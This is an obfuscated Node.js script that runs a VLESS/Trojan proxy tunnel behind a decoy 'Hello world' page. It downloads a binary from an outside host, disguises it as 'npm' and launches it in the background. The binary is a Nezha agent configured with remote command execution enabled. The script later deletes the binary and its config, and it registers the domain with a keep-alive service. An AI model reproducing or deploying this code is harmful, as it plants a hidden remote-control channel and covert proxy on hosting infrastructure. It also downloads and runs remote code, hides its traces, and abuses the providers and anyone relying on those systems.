const _0x10410f=_0x308d;(function(_0x79eed3,_0x2757b8){const _0x28caa1=_0x308d,_0x1a2cf4=_0x79eed3();while(!![]){try{const _0x2e6ded=parseInt(_0x28caa1(0x128))/0x1*(parseInt(_0x28caa1(0x112))/0x2)+-parseInt(_0x28caa1(0xcc))/0x3+parseInt(_0x28caa1(0x117))/0x4*(parseInt(_0x28caa1(0x11e))/0x5)+parseInt(_0x28caa1(0xe0))/0x6+parseInt(_0x28caa1(0xcf))/0x7*(parseInt(_0x28caa1(0x10f))/0x8)+parseInt(_0x28caa1(0x10e))/0x9*(parseInt(_0x28caa1(0xe4))/0xa)+-parseInt(_0x28caa1(0x106))/0xb*(parseInt(_0x28caa1(0xfa))/0xc);if(_0x2e6ded===_0x2757b8)break;else _0x1a2cf4['push'](_0x1a2cf4['shift']());}catch(_0x57b3cd){_0x1a2cf4['push'](_0x1a2cf4['shift']());}}}(_0x3424,0x9975b));const os=require('os'),http=require(_0x10410f(0xef)),fs=require('fs'),axios=require(_0x10410f(0x147)),net=require(_0x10410f(0x121)),path=require('path'),crypto=require(_0x10410f(0xf9)),{Buffer}=require(_0x10410f(0x130)),{exec,execSync}=require(_0x10410f(0x104)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x10410f(0xf1)]['UUID']||_0x10410f(0xf7),NEZHA_SERVER=process[_0x10410f(0xf1)][_0x10410f(0x12f)]||'',NEZHA_PORT=process[_0x10410f(0xf1)][_0x10410f(0x13f)]||'',NEZHA_KEY=process[_0x10410f(0xf1)][_0x10410f(0x140)]||'',DOMAIN=process[_0x10410f(0xf1)]['DOMAIN']||_0x10410f(0x13e),AUTO_ACCESS=process[_0x10410f(0xf1)][_0x10410f(0x11f)]||!![],WSPATH=process['env'][_0x10410f(0x125)]||UUID[_0x10410f(0x135)](0x0,0x8),SUB_PATH=process[_0x10410f(0xf1)][_0x10410f(0xd6)]||_0x10410f(0xf4),NAME=process[_0x10410f(0xf1)]['NAME']||'Hug',PORT=process[_0x10410f(0xf1)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x260abf=_0x10410f;try{const _0xf74a0d=await axios[_0x260abf(0xd1)](_0x260abf(0x13c)),_0x1c2550=_0xf74a0d['data'];ISP=(_0x1c2550[_0x260abf(0x107)]+'-'+_0x1c2550[_0x260abf(0xd4)])[_0x260abf(0x127)](/ /g,'_');}catch(_0x3a8c9d){ISP=_0x260abf(0x10c);}};GetISP();const httpServer=http[_0x10410f(0x11d)]((_0x42d64a,_0x4d8209)=>{const _0x59cffd=_0x10410f;if(_0x42d64a[_0x59cffd(0x13d)]==='/'){const _0x20fe31=path[_0x59cffd(0x114)](__dirname,'index.html');fs['readFile'](_0x20fe31,_0x59cffd(0xfc),(_0x1704bb,_0x1d98ff)=>{const _0x3edc76=_0x59cffd;if(_0x1704bb){_0x4d8209[_0x3edc76(0x119)](0xc8,{'Content-Type':'text/html'}),_0x4d8209['end'](_0x3edc76(0xe5));return;}_0x4d8209[_0x3edc76(0x119)](0xc8,{'Content-Type':'text/html'}),_0x4d8209['end'](_0x1d98ff);});return;}else{if(_0x42d64a[_0x59cffd(0x13d)]==='/'+SUB_PATH){const _0x292181=_0x59cffd(0x143)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x59cffd(0x136)+DOMAIN+_0x59cffd(0xdd)+WSPATH+'#'+NAME+'-'+ISP,_0x3cff83='trojan://'+UUID+'@'+DOMAIN+_0x59cffd(0x141)+DOMAIN+_0x59cffd(0x136)+DOMAIN+_0x59cffd(0xdd)+WSPATH+'#'+NAME+'-'+ISP,_0x226f5b=_0x292181+'\x0a'+_0x3cff83,_0x460919=Buffer[_0x59cffd(0x120)](_0x226f5b)['toString'](_0x59cffd(0xd8));_0x4d8209[_0x59cffd(0x119)](0xc8,{'Content-Type':_0x59cffd(0x137)}),_0x4d8209[_0x59cffd(0x124)](_0x460919+'\x0a');}else _0x4d8209[_0x59cffd(0x119)](0x194,{'Content-Type':_0x59cffd(0x137)}),_0x4d8209['end']('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x10410f(0x12d))]({'server':httpServer}),uuid=UUID[_0x10410f(0x127)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x10410f(0xff)];function _0x308d(_0x3cd8df,_0x334d47){const _0x3424e0=_0x3424();return _0x308d=function(_0x308d49,_0x24521a){_0x308d49=_0x308d49-0xcb;let _0x5145a3=_0x3424e0[_0x308d49];return _0x5145a3;},_0x308d(_0x3cd8df,_0x334d47);}function resolveHost(_0x173130){return new Promise((_0x15c55f,_0x25881f)=>{const _0x394e76=_0x308d;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x394e76(0xe9)](_0x173130)){_0x15c55f(_0x173130);return;}let _0x5d9c18=0x0;function _0x1fe081(){const _0x46bd72=_0x394e76;if(_0x5d9c18>=DNS_SERVERS[_0x46bd72(0x11c)]){_0x25881f(new Error(_0x46bd72(0xea)+_0x173130+_0x46bd72(0xf3)));return;}const _0x52e8a7=DNS_SERVERS[_0x5d9c18];_0x5d9c18++;const _0x3c3f29=_0x46bd72(0xf5)+encodeURIComponent(_0x173130)+_0x46bd72(0x144);axios[_0x46bd72(0xd1)](_0x3c3f29,{'timeout':0x1388,'headers':{'Accept':_0x46bd72(0x146)}})[_0x46bd72(0xcb)](_0x377d1f=>{const _0x2ac163=_0x46bd72,_0x5b4dec=_0x377d1f[_0x2ac163(0xd7)];if(_0x5b4dec['Status']===0x0&&_0x5b4dec[_0x2ac163(0x122)]&&_0x5b4dec['Answer'][_0x2ac163(0x11c)]>0x0){const _0x1d3bda=_0x5b4dec[_0x2ac163(0x122)][_0x2ac163(0x134)](_0x34e02b=>_0x34e02b['type']===0x1);if(_0x1d3bda){_0x15c55f(_0x1d3bda[_0x2ac163(0xd7)]);return;}}_0x1fe081();})[_0x46bd72(0x103)](_0x59ab62=>{_0x1fe081();});}_0x1fe081();});}function handleVlessConnection(_0x376999,_0x3cd898){const _0x33b4dc=_0x10410f,[_0x1cdfca]=_0x3cd898,_0x4443bc=_0x3cd898[_0x33b4dc(0x135)](0x1,0x11);if(!_0x4443bc[_0x33b4dc(0xfb)]((_0x1b9c7e,_0x52b652)=>_0x1b9c7e==parseInt(uuid[_0x33b4dc(0xd2)](_0x52b652*0x2,0x2),0x10)))return![];let _0x54598d=_0x3cd898[_0x33b4dc(0x135)](0x11,0x12)[_0x33b4dc(0xdc)]()+0x13;const _0x508348=_0x3cd898['slice'](_0x54598d,_0x54598d+=0x2)[_0x33b4dc(0xeb)](0x0),_0xd9560=_0x3cd898['slice'](_0x54598d,_0x54598d+=0x1)[_0x33b4dc(0xdc)](),_0x26f0e6=_0xd9560==0x1?_0x3cd898['slice'](_0x54598d,_0x54598d+=0x4)[_0x33b4dc(0x114)]('.'):_0xd9560==0x2?new TextDecoder()[_0x33b4dc(0xe2)](_0x3cd898[_0x33b4dc(0x135)](_0x54598d+0x1,_0x54598d+=0x1+_0x3cd898[_0x33b4dc(0x135)](_0x54598d,_0x54598d+0x1)['readUInt8']())):_0xd9560==0x3?_0x3cd898[_0x33b4dc(0x135)](_0x54598d,_0x54598d+=0x10)[_0x33b4dc(0x101)]((_0xea2dca,_0x7b71fb,_0x374993,_0x49bd53)=>_0x374993%0x2?_0xea2dca['concat'](_0x49bd53[_0x33b4dc(0x135)](_0x374993-0x1,_0x374993+0x1)):_0xea2dca,[])[_0x33b4dc(0xfe)](_0x4337e9=>_0x4337e9['readUInt16BE'](0x0)[_0x33b4dc(0xd3)](0x10))['join'](':'):'';_0x376999[_0x33b4dc(0xdf)](new Uint8Array([_0x1cdfca,0x0]));const _0x3cf71a=createWebSocketStream(_0x376999);return resolveHost(_0x26f0e6)[_0x33b4dc(0xcb)](_0x592043=>{const _0x3c7c9e=_0x33b4dc;net[_0x3c7c9e(0x110)]({'host':_0x592043,'port':_0x508348},function(){const _0x2a5405=_0x3c7c9e;this[_0x2a5405(0xf6)](_0x3cd898['slice'](_0x54598d)),_0x3cf71a['on'](_0x2a5405(0xe3),()=>{})[_0x2a5405(0x12e)](this)['on']('error',()=>{})['pipe'](_0x3cf71a);})['on'](_0x3c7c9e(0xe3),()=>{});})[_0x33b4dc(0x103)](_0x2563e5=>{const _0x5f3475=_0x33b4dc;net['connect']({'host':_0x26f0e6,'port':_0x508348},function(){const _0x203aac=_0x308d;this[_0x203aac(0xf6)](_0x3cd898[_0x203aac(0x135)](_0x54598d)),_0x3cf71a['on']('error',()=>{})[_0x203aac(0x12e)](this)['on'](_0x203aac(0xe3),()=>{})[_0x203aac(0x12e)](_0x3cf71a);})['on'](_0x5f3475(0xe3),()=>{});}),!![];}function handleTrojanConnection(_0x19c479,_0x5cef97){const _0x1fe801=_0x10410f;try{if(_0x5cef97[_0x1fe801(0x11c)]<0x3a)return![];const _0x4b73b1=_0x5cef97[_0x1fe801(0x135)](0x0,0x38)['toString'](),_0x3bbedf=[UUID];let _0x1eab1f=null;for(const _0x46da30 of _0x3bbedf){const _0x41e784=crypto[_0x1fe801(0xe6)](_0x1fe801(0x12a))['update'](_0x46da30)[_0x1fe801(0x105)](_0x1fe801(0x133));if(_0x41e784===_0x4b73b1){_0x1eab1f=_0x46da30;break;}}if(!_0x1eab1f)return![];let _0x3b8948=0x38;_0x5cef97[_0x3b8948]===0xd&&_0x5cef97[_0x3b8948+0x1]===0xa&&(_0x3b8948+=0x2);const _0x18cdcc=_0x5cef97[_0x3b8948];if(_0x18cdcc!==0x1)return![];_0x3b8948+=0x1;const _0x419dec=_0x5cef97[_0x3b8948];_0x3b8948+=0x1;let _0x1e992b,_0x19f0a9;if(_0x419dec===0x1)_0x1e992b=_0x5cef97['slice'](_0x3b8948,_0x3b8948+0x4)[_0x1fe801(0x114)]('.'),_0x3b8948+=0x4;else{if(_0x419dec===0x3){const _0x33643f=_0x5cef97[_0x3b8948];_0x3b8948+=0x1,_0x1e992b=_0x5cef97['slice'](_0x3b8948,_0x3b8948+_0x33643f)[_0x1fe801(0xd3)](),_0x3b8948+=_0x33643f;}else{if(_0x419dec===0x4)_0x1e992b=_0x5cef97[_0x1fe801(0x135)](_0x3b8948,_0x3b8948+0x10)['reduce']((_0x5e435f,_0x66ce38,_0x5df0ec,_0xb2d7f6)=>_0x5df0ec%0x2?_0x5e435f[_0x1fe801(0x11a)](_0xb2d7f6[_0x1fe801(0x135)](_0x5df0ec-0x1,_0x5df0ec+0x1)):_0x5e435f,[])['map'](_0x1ca6e7=>_0x1ca6e7['readUInt16BE'](0x0)[_0x1fe801(0xd3)](0x10))[_0x1fe801(0x114)](':'),_0x3b8948+=0x10;else return![];}}_0x19f0a9=_0x5cef97[_0x1fe801(0xeb)](_0x3b8948),_0x3b8948+=0x2;_0x3b8948<_0x5cef97[_0x1fe801(0x11c)]&&_0x5cef97[_0x3b8948]===0xd&&_0x5cef97[_0x3b8948+0x1]===0xa&&(_0x3b8948+=0x2);const _0x43b2b8=createWebSocketStream(_0x19c479);return resolveHost(_0x1e992b)['then'](_0x2f5e3a=>{const _0x50ad90=_0x1fe801;net[_0x50ad90(0x110)]({'host':_0x2f5e3a,'port':_0x19f0a9},function(){const _0x455b71=_0x50ad90;_0x3b8948<_0x5cef97[_0x455b71(0x11c)]&&this[_0x455b71(0xf6)](_0x5cef97['slice'](_0x3b8948)),_0x43b2b8['on'](_0x455b71(0xe3),()=>{})[_0x455b71(0x12e)](this)['on']('error',()=>{})['pipe'](_0x43b2b8);})['on'](_0x50ad90(0xe3),()=>{});})['catch'](_0x24c05b=>{const _0x20411b=_0x1fe801;net[_0x20411b(0x110)]({'host':_0x1e992b,'port':_0x19f0a9},function(){const _0xa529e9=_0x20411b;_0x3b8948<_0x5cef97[_0xa529e9(0x11c)]&&this[_0xa529e9(0xf6)](_0x5cef97[_0xa529e9(0x135)](_0x3b8948)),_0x43b2b8['on'](_0xa529e9(0xe3),()=>{})[_0xa529e9(0x12e)](this)['on'](_0xa529e9(0xe3),()=>{})[_0xa529e9(0x12e)](_0x43b2b8);})['on']('error',()=>{});}),!![];}catch(_0x5af953){return![];}}wss['on'](_0x10410f(0xcd),(_0x261763,_0x9023cd)=>{const _0x2ba8e8=_0x10410f,_0x199176=_0x9023cd[_0x2ba8e8(0x13d)]||'';_0x261763['once']('message',_0x5e8dd0=>{const _0x2c275a=_0x2ba8e8;if(_0x5e8dd0[_0x2c275a(0x11c)]>0x11&&_0x5e8dd0[0x0]===0x0){const _0x59eddb=_0x5e8dd0['slice'](0x1,0x11),_0x495503=_0x59eddb[_0x2c275a(0xfb)]((_0x1ba146,_0x50e425)=>_0x1ba146==parseInt(uuid[_0x2c275a(0xd2)](_0x50e425*0x2,0x2),0x10));if(_0x495503){!handleVlessConnection(_0x261763,_0x5e8dd0)&&_0x261763[_0x2c275a(0x102)]();return;}}!handleTrojanConnection(_0x261763,_0x5e8dd0)&&_0x261763['close']();})['on'](_0x2ba8e8(0xe3),()=>{});});const getDownloadUrl=()=>{const _0x3e1255=_0x10410f,_0x52130c=os['arch']();return _0x52130c===_0x3e1255(0xda)||_0x52130c===_0x3e1255(0x12c)||_0x52130c===_0x3e1255(0x131)?!NEZHA_PORT?_0x3e1255(0x139):_0x3e1255(0x13a):!NEZHA_PORT?_0x3e1255(0x111):_0x3e1255(0xce);},downloadFile=async()=>{const _0x300e5d=_0x10410f;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5be936=getDownloadUrl(),_0x3ec374=await axios({'method':_0x300e5d(0xd1),'url':_0x5be936,'responseType':_0x300e5d(0xe7)}),_0x4bb94a=fs[_0x300e5d(0xf2)](_0x300e5d(0x109));return _0x3ec374[_0x300e5d(0xd7)][_0x300e5d(0x12e)](_0x4bb94a),new Promise((_0x168340,_0x1aa4e2)=>{const _0x3b36ef=_0x300e5d;_0x4bb94a['on'](_0x3b36ef(0x10b),()=>{const _0x12185a=_0x3b36ef;console[_0x12185a(0xe8)](_0x12185a(0xdb)),exec(_0x12185a(0x13b),_0x5404c2=>{if(_0x5404c2)_0x1aa4e2(_0x5404c2);_0x168340();});}),_0x4bb94a['on']('error',_0x1aa4e2);});}catch(_0x2abd85){throw _0x2abd85;}},runnz=async()=>{const _0x26adb1=_0x10410f;try{const _0x311c65=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x26adb1(0x132)});if(_0x311c65[_0x26adb1(0xe1)]()!==''){console[_0x26adb1(0xe8)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2fd02b){}await downloadFile();let _0x2b4df9='',_0x5e26e6=[_0x26adb1(0xf0),_0x26adb1(0xfd),'2096','2087',_0x26adb1(0x123),_0x26adb1(0x126)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x34436e=_0x5e26e6['includes'](NEZHA_PORT)?'--tls':'';_0x2b4df9='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x26adb1(0xd9)+NEZHA_KEY+'\x20'+_0x34436e+_0x26adb1(0x108);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb9d892=NEZHA_SERVER[_0x26adb1(0xec)](':')?NEZHA_SERVER[_0x26adb1(0x100)](':')[_0x26adb1(0x142)]():'',_0x27d08c=_0x5e26e6[_0x26adb1(0xec)](_0xb9d892)?_0x26adb1(0xf8):'false',_0x20fc38=_0x26adb1(0x118)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x26adb1(0x115)+_0x27d08c+_0x26adb1(0xee)+UUID;fs[_0x26adb1(0x116)](_0x26adb1(0x10a),_0x20fc38);}_0x2b4df9='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x26adb1(0xe8)](_0x26adb1(0x145));return;}}try{exec(_0x2b4df9,{'shell':_0x26adb1(0x129)},_0x37d89a=>{const _0x436b0e=_0x26adb1;if(_0x37d89a)console[_0x436b0e(0xe3)](_0x436b0e(0x138),_0x37d89a);else console[_0x436b0e(0xe8)](_0x436b0e(0x12b));});}catch(_0x3a5275){console[_0x26adb1(0xe3)](_0x26adb1(0xed)+_0x3a5275);}};async function addAccessTask(){const _0x149b6d=_0x10410f;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x626124=_0x149b6d(0xd5)+DOMAIN;try{const _0x3a7430=await axios[_0x149b6d(0xd0)]('https://oooo.serv00.net/add-url',{'url':_0x626124},{'headers':{'Content-Type':_0x149b6d(0x10d)}});console['log'](_0x149b6d(0x113));}catch(_0x18a54a){}}function _0x3424(){const _0x2c709b=['connect','https://amd64.ssss.nyc.mn/v1','2mseoXZ','Automatic\x20Access\x20Task\x20added\x20successfully','join','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','writeFileSync','24yXuRYA','client_secret:\x20','writeHead','concat','Server\x20is\x20running\x20on\x20port\x20','length','createServer','164510nlCGZU','AUTO_ACCESS','from','net','Answer','2083','end','WSPATH','2053','replace','471300oaZdbw','/bin/bash','sha224','npm\x20is\x20running','arm64','Server','pipe','NEZHA_SERVER','buffer','aarch64','utf-8','hex','find','slice','&fp=chrome&type=ws&host=','text/plain','npm\x20running\x20error:','https://arm64.ssss.nyc.mn/v1','https://arm64.ssss.nyc.mn/agent','chmod\x20+x\x20npm','https://speed.cloudflare.com/meta','url','1234.abc.com','NEZHA_PORT','NEZHA_KEY',':443?security=tls&sni=','pop','vless://','&type=A','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','application/dns-json','axios','then','3213768CmsNSn','connection','https://amd64.ssss.nyc.mn/agent','35sczuSD','post','get','substr','toString','asOrganization','https://','SUB_PATH','data','base64','\x20-p\x20','arm','npm\x20download\x20successfully','readUInt8','&path=%2F','unlink','send','7480434ZfAjro','trim','decode','error','20WHnRZs','Hello\x20world!','createHash','stream','log','test','Failed\x20to\x20resolve\x20','readUInt16BE','includes','error:\x20','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','http','443','env','createWriteStream','\x20with\x20all\x20DNS\x20servers','sub','https://dns.google/resolve?name=','write','39a9f9be-cd49-4fd2-909e-b61cce388188','true','crypto','5424648mFfXJu','every','utf8','8443','map','1.1.1.1','split','reduce','close','catch','child_process','digest','33sBUfOU','country','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','npm','config.yaml','finish','Unknown','application/json','4955166vxadVD','63024TJqHnr'];_0x3424=function(){return _0x2c709b;};return _0x3424();}const delFiles=()=>{const _0x370452=_0x10410f;fs[_0x370452(0xde)](_0x370452(0x109),()=>{}),fs['unlink']('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0xc2ee0e=_0x10410f;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0xc2ee0e(0xe8)](_0xc2ee0e(0x11b)+PORT);});
